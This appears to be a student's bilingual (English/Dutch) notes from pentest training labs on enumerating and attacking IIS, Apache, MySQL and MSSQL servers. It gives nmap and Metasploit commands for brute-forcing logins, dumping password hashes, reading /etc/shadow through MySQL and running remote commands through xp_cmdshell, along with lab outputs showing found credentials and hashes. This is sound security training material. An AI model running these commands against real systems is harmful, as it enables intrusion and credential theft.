Ignoring eventmachine-1.3.0.dev.1 because its extensions are not built. Try: gem pristine eventmachine --version 1.3.0.dev.1
Ignoring fxruby-1.6.29 because its extensions are not built. Try: gem pristine fxruby --version 1.6.29
http://10.2.24.249 [302 Found] ASP_NET[4.0.30319], Cookies[ASP.NET_SessionId,Server], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[ASP.NET_SessionId], IP[10.2.24.249], Microsoft-IIS[10.0], RedirectLocation[/Default.aspx], Title[Object moved], X-Powered-By[ASP.NET], X-XSS-Protection[0]
http://10.2.24.249/Default.aspx [302 Found] ASP_NET[4.0.30319], Cookies[ASP.NET_SessionId,Server], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[ASP.NET_SessionId], IP[10.2.24.249], Microsoft-IIS[10.0], RedirectLocation[/Default.aspx], Title[Object moved], X-Powered-By[ASP.NET], X-XSS-Protection[0]

Using the whatweb tool we found information about the running IIS Server as mentioned below.  
● IIS Server version is 10.0  
● ASP.NET Version is 4.0.30319  
● XSS Protection is 0  
● The default page of the target web application is /Default.aspx


oot@attackdefense:~# http 10.2.24.249
HTTP/1.1 302 Found
Cache-Control: private
Content-Length: 130
Content-Type: text/html; charset=utf-8
Date: Tue, 06 Jun 2023 11:39:56 GMT
Location: /Default.aspx
Server: Microsoft-IIS/10.0
Set-Cookie: ASP.NET_SessionId=h01rqvfmvmcrfvzxssw2c0wb; path=/; HttpOnly; SameSite=Lax
Set-Cookie: Server=RE9UTkVUR09BVA==; path=/
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
X-XSS-Protection: 0

object moved to < href="/Default.aspx">


**Default.aspx is de default pagina als je de website bezoekt voor websites gebouwdt met microsoft aspx** 

### HTTP ISS Nmap script 

- run: nmap ip 
- run service scan: nmap ip -sV  and navigate to the website if port 80 is open 
- run the following to check services but also what directories there are: nmap: ip -sV -p 80 --script http-enum 
- run: nmap: ip -sV -p 80 --script http-headers 
- run: nmap: ip -sV -p 80 --script http-methods --script=args http-methods.url-path=/webdav/
- run this if you have a results for webdav using the above command: nmap: ip -sV -p 80 --script http-webdav-scan --script=args http-methods.url-path=/webdav/


-- lab -- 

- Identify IIS Server
  80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
  
- Get webserver header details

80/tcp open  http    Microsoft IIS httpd 10.0
| http-headers:                                                                          |
| -------------------------------------------------------------------------------------- |
| Cache-Control: private                                                                 |
| Content-Type: text/html; charset=utf-8                                                 |
**| Location: /Default.aspx                                                                |
| Server: Microsoft-IIS/10.0**                                                             |
| Set-Cookie: ASP.NET_SessionId=bjnf2tkiimxv3lwqoclojhle; path=/; HttpOnly; SameSite=Lax |
**| X-AspNet-Version: 4.0.30319**                                                            |
| Set-Cookie: Server=RE9UTkVUR09BVA = =; path=/                                            
**| X-XSS-Protection: 0                                                                    |
| X-Powered-By: ASP.NET**                                                                  |
| Date: Thu, 08 Jun 2023 09:02:38 GMT                                                    |
| Connection: close                                                                      
 Content-Length: 130                                                                    

  
- Enumerated HTTP methods
  
  ORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|   /content/: Potentially interesting folder
|   /downloads/: Potentially interesting folder
|_  /webdav/: Potentially interesting folder
|_http-server-header: Microsoft-IIS/10.0

  
  
- Detect WebDAV configuration - etc (check all allowed methods on webdav)

root@attackdefense:~# nmap 10.2.26.147 -sV -p 80 --script http-methods --script-args http-methods.url-path=/webdav/

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   *Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT*
|   Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_  Path tested: /webdav/
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

root@attackdefense:~# nmap 10.2.26.147 -sV -p 80 --script http-webdav-scan --script-args http-methods.url-path=/webdav/   

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-webdav-scan: 
|   Server Date: Thu, 08 Jun 2023 09:18:01 GMT
|   Server Type: Microsoft-IIS/10.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
|_  WebDAV type: Unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


je kunt bovenstaande command ook uitvoeren zonder p 80 (port te specificeren)


### HTTP Apache 

- run: run basic scan, service scan on specific port (80) 
- run when you see apache: nmap ip -p 80 -sV -script banner 
	- banner: is information that is shared with you computer, the first time it connects remotely to another machine 
 - lets move to: mfsconsole (metasploit framework)
	 - use auxiliary/scanner/http/http_version 
		 - set rhosts (target ip) 
			- options 
		- run 
		- exit 
	- use auxiliary/scanner/http/brute_dirs 
		- show options 
		- set rhost to target up ip 
- - dirb http://ip /usr/share/metasploit-framework/data/wordlists/directory.txt (zelfde als brute_dirs scanner in metasploit)
- other commands you can run: 
	- curl ip 
	- wget "http://ip/index" will retrieve webfiles 
	- browsh --startup-url ip (will render the website)s
	- lynx http://ip 
- robot.txt: 
	- msfconsole 
		- use  auxiliary/scanner/http/robots_txt 
		- set rhost to target ip 
		- options -> run 
![[Pasted image 20230608132146.png]]

robot.txt -> dit is een pagina die aangeeft welke bestanden mogen gelezen worden door search engines - het kan je vertellen welke subdirectories er zijn 

--lab -- 

1. Which web server software is running on the target server and also find out the version using nmap.
   
   root@INE:~# nmap 192.220.202.3 -sV

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

![[Pasted image 20230608134329.png]]

   
   
2. Which web server software is running on the target server and also find out the version using suitable metasploit module.
   
   msf6 auxiliary(scanner/http/http_version) > run
	192.220.202.3:80 Apache/2.4.18 (Ubuntu)

   
   
3. Check what web app is hosted on the web server using curl command.
   
![[Pasted image 20230608132858.png]]
   
   
4. Check what web app is hosted on the web server using wget command.
   
5. Check what web app is hosted on the web server using browsh CLI based browser.
   
6. Check what web app is hosted on the web server using lynx CLI based browser.
   
   
7. Perform bruteforce on webserver directories and list the names of directories found. Use brute_dirs metasploit module.
   
   ![[Pasted image 20230608133747.png]]
   
   
   
8. Use the directory buster (dirb) with tool/usr/share/metasploit-framework/data/wordlists/directory.txt dictionary to check if any directory is present in the root folder of the web server. List the names of found directories.
   

![[Pasted image 20230608134200.png]]
   
9. Which bot is specifically banned from accessing a specific directory (flag) ?

![[Pasted image 20230608133904.png]]
of 

![[Pasted image 20230608134850.png]]


## SLQ 


#### MySQL

Runs on linux or unix and allows users to store info in database, can be pulled and used in many operations. It is often misconfigured and vulnerable 

**!!!!!!!!!!!!!! Let op by commands in mysql vergeet niet de ; aan het einde van de command** 

how do we enumerate? 
- run service scan
- run service scan on port with mysql 
- mysql -h ip -u root                                            (-h = host -u = username, we are running out because root is often default admin we will try to login in sql)
	- if you can login run: show databases (to look at the data)
	- run: use {database}; (we are looking into the database "books") or run: select count(\*) from authors; 
	- run help  to see commands in sql 
	  
- msfconsole
- use auxiliary/scanner/mysql/mysql_writeable_dirs  
- set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt 
- setg rhost 192.125.250.3                               (setg means it will be set as global host so for the whole metasploit session this ip will be used so you wont habe to re-enter it everytime)
- set verbose false    (verbose is in the advanced options and it will give you detailed status messages - to see advanced options type advances )
- set password "" 
- options  (check if you have al required items then run)

- use auxiliary/scanner/mysql/mysql_hashdump  (you will get hashes of users)
- options - set username root    set password "" run 

loginto mysql (mysql -h ip -u root)
- select load_file("/etc/shadow")   (test if you have access to files on sql system) 

nmap: 
- run: nmap ip -sV -p port --script=mysql-empty-password   (see what account you can get into with null session (empty password))
- run: nmap ip -sV -p port --script=mysql-info 
  
- nmap ip -sV -p port --script=mysql-users --script args="mysqlusers='root',mysqlpass=' ' " 
  
- if you cant log into sql you can try this: nmap ip -sV -p port --script=mysql-databases --script args="mysqlusers='root',mysqlpass=' ' " 
- ![[Pasted image 20230608170007.png]]
- nmap ip -sV -p port --script=mysql-audit --script args="mysql-audit.username='root',mysql-audit.password=' ',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit' "
  
- Get all the hashes: nmap ip -sV -p port --script=mysql-dump-hashes --script args="username='root',password=' ' " 
  
- use nmap to run a query: nmap ip -sV -p port --script=mysql-query --script args=" query='select count(\*) from books.authors;', username='root',password=' ' " 


-- Lab ---  192.100.216.3 of 

1. What is the version of MySQL server?
   
   root@attackdefense:~# nmap 192.100.216.3 -sV 
		PORT     STATE SERVICE VERSION
		**3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1**

   
   
2. What command is used to connect to remote MySQL database?
   
  mysql -h ip -u root   
   
3. How many databases are present on the database server?
   
   ![[Pasted image 20230609143203.png]]
   
4. How many records are present in table “authors”? This table is present inside the “books” database. 10 
   
![[Pasted image 20230609143645.png]]
   ![[Pasted image 20230609143828.png]]
5. Dump the schema of all databases from the server using suitable metasploit module?
![[Pasted image 20230609145208.png]]
   
   
   
6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
   
   In Metasploit, the auxiliary module auxiliary/scanner/mysql/mysql_file_dir can be used for directory scanning in MySQL.
   
   ![[Pasted image 20230609145426.png]]
   
   
   
7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
   
   In Metasploit, the auxiliary module `auxiliary/scanner/mysql/mysql_file_enum` can be used to scan for files in a MySQL server.
   
   ![[Pasted image 20230609151040.png]]
   
   
   
8. Find the system password hash for user "root".
 

![[Pasted image 20230609153050.png]]

-> if you want to get hashes of users - loginto mysql remotly and try to access the /etc/shadow file by running the following command: select load_file("/etc/shadow")

![[Pasted image 20230609153323.png]] 

9. How many database users are present on the database server? Lists their names and password hashes.


![[Pasted image 20230609151550.png]]



10. Check whether anonymous login is allowed on MySQL Server.
    ![[Pasted image 20230609155308.png]]
    
    
11. Check whether “InteractiveClient” capability is supported on the MySQL server.
    
    ![[Pasted image 20230609155430.png]]
    
12. Enumerate the users present on MySQL database server using mysql-users nmap script.


nmap 192.128.174.3 -p 3306 --script=mysql-users --script args="mysqlusers='root',mysqlpass='' " 



nmap -sV --script=mysql-users
    
    
13. List all databases stored on the MySQL Server using nmap script.
    
    
    
    
14. Find the data directory used by mysql server using nmap script.
15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
16. Dump all user hashes using  nmap script.
17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script (flag).


### MySQL Dictionary Attack 

Een MySQL dictionary-aanval is een aanvalsvector waarbij een aanvaller probeert toegang te krijgen tot een MySQL-database door systematisch verschillende gebruikersnamen en wachtwoorden uit een vooraf samengestelde lijst, ook wel een woordenboek genoemd, te proberen. 

- run a service scan 
- utalize msfconsole and an auxiliary scanner to brute force the login 
	- use auxiliary.scanner/mysql/mysql_login
	- set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 
	- set verbose  false 
	- set stop_on_success true (we only need one password for username )
	- set username root 
	  
- Another way to bruteforce login: 
	hydra 
	- hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ip mysql 
	


-- Lab --- 
192.124.83.3

1. Find the password of user “root” which is required to access the MySQL server. Use suitable metasploit module with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
   
   ![[Pasted image 20230613142719.png]]
   
   
   
   
2. Find the password of user “root” which is required to access the MySQL server. Use Hydra with password dictionary: /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.124.83.3 mysql 

![[Pasted image 20230613143053.png]]


### MSSQL Nmap scripts 

- run nmap scan and service scan on port sql 
- run script for ms-sql-info: nmap ip -p port --script ms-sql-info 
- run script for ms-sql-ntlm-info: nmap ip -p port --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 
		This script is designed to gather information related to Microsoft SQL Server using the NTLM authentication method.
- run MSSQL brute force: nmap ip -p port --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt  
- Check if there are any empty passwords: nmap ip -p port --script ms-sql-empty-password  
- How to take advantange of results from bruteforce: 
	- run query: nmap ip -p port --script ms-sql-query --script-args mmsql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT \* FROM master..syslogins"  -oN output.txt 

![[Pasted image 20230613150808.png]]
	- `--script ms-sql-query`: Hiermee geef je aan dat je de Nmap-script "ms-sql-query" wilt uitvoeren. Deze script maakt het mogelijk om aangepaste SQL-query's uit te voeren op de SQL Server-database.
	`--script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins"`: Dit geeft de argumenten door aan het script. Het stelt de gebruikersnaam (`mssql.username`) in op "admin" en het wachtwoord (`mssql.password`) op "anamaria". Het argument `ms-sql-query.query` bevat de specifieke SQL-query die je wilt uitvoeren op de database, in dit geval "SELECT * FROM master..syslogins".  De `syslogins`-tabel is specifiek voor Microsoft SQL Server-databases. Het is een systeemtabel die gebruikersaccounts en inloggegevens van de database bevat. Elke rij in deze tabel vertegenwoordigt een gebruikersaccount met bijbehorende informatie, zoals gebruikersnaam, wachtwoord en privileges.
	- `-oN output.txt`: Dit zorgt ervoor dat de resultaten van de scan worden opgeslagen in het bestand "output.txt". Het rapport van de scan wordt opgeslagen in een normaal tekstbestand.

- dump hashes: nmap ip -p port --script ms-sql-dump-hashes   --script-args mmsql.username=admin,mssql.password=anamaria


- try to run code:  nmap ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="ipconfiig"
(if successfull you are able to run commands in a shell remotely)


- map ip -p port --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cdm="type C:\\flag.txt"   
	(flag is windows version of cat (read a file))


-- LAB -- 


1. Identify MSSQL Database Server 
   
   1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000

   
   
2. Find information from the MSSQL server with NTLM.
   
   root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:41 IST
Nmap scan report for 10.2.22.77
Host is up (0.0067s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393

   
3. Enumerate all valid MSSQL users and passwords
   
  root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:45 IST
Nmap scan report for 10.2.22.77
Host is up (0.0058s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute: 
|   [10.2.22.77:1433]
|     Credentials found:
|       auditor:jasmine1 => Login Success
|       dbadmin:bubbles1 => Login Success
|_      admin:anamaria => Login Success

 
   
4. Identify 'sa' user password
   
   root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-empty-password                     
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:46 IST
Nmap scan report for 10.2.22.77
Host is up (0.0071s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-empty-password: 
|   [10.2.22.77:1433]
|_    sa:empty => Login Success


   
5. Execute MSSQL query to extract sysusers
   
![[Pasted image 20230614172347.png]]
   
   
   
   
6. Dump MSSQL users hashes
   
   root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
Starting Nmap 7.91 ( https://nmap.org ) at 2023-06-14 20:57 IST
Nmap scan report for 10.2.22.77
Host is up (0.0063s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-dump-hashes: 
| [10.2.22.77:1433]
|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b

   
   

7. Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)



root@attackdefense:~# nmap 10.2.22.77 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type C:\flag.txt"


PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell: 
|   10.2.22.77:1433
|     Command: type C:\flag.txt
|       output
|       ======
|_      1d1803570245aa620446518b2154f324
 




### MSSQL Metasploit 

- run service scan on sql ports 
- run script for ms-sql-info (--script ms-sql-info)
  
- use metasploit to bruteforce logon info 
	- use aux scanner for ms-sql : mssql_login 
	- setg rhost ip (setg stays persistent)
	- set  user_file /root/Desktop/wordlist/common_users.txt 
	- set set pass_file /root/desktop.wordlist/100-common-passwords.txt 
	  
- use another scanner: auxiliary/admin/mssql/mssql_enum 
  
- use enum module: auxiliary/admin/mssql/mssql_sql_logins 
  
- check if you can run commands: use auxiliary/admin/mssql/mssql_exec 
	- set cmd whoami 
	  
- enumerate domain accounts:   use auxiliary/admin/mssql/mssql_enum_domain_accounts


Domain accounts, in the context of Microsoft SQL Server, refer to user accounts that are managed and authenticated by a Windows Active Directory domain. These accounts are used to provide access to various resources within a domain, including SQL Server databases 

-- Lab --


- Discover valid users and their passwords
  
  msf6 auxiliary(scanner/mssql/mssql_login) > run

[] 10.2.24.7:1433        - 10.2.24.7:1433 - MSSQL - Starting authentication scanner.
[+] 10.2.24.7:1433        - 10.2.24.7:1433 - Login Successful: WORKSTATION\sa:
[+] 10.2.24.7:1433        - 10.2.24.7:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.2.24.7:1433        - 10.2.24.7:1433 - Login Successful: WORKSTATION\auditor:nikita
[] 10.2.24.7:1433        - Scanned 1 of 1 hosts (100% complete)

  
  
- Enumerate MSSQL configuration
  
  ![[Pasted image 20230614174714.png]]



- Enumerate all MSSQL logins
  
  ![[Pasted image 20230614174912.png]]
  ![[Pasted image 20230614175419.png]]
  
- Execute a command on the target machine
  
  ![[Pasted image 20230614175134.png]]
  
  
- Enumerate all available system users

![[Pasted image 20230614175215.png]]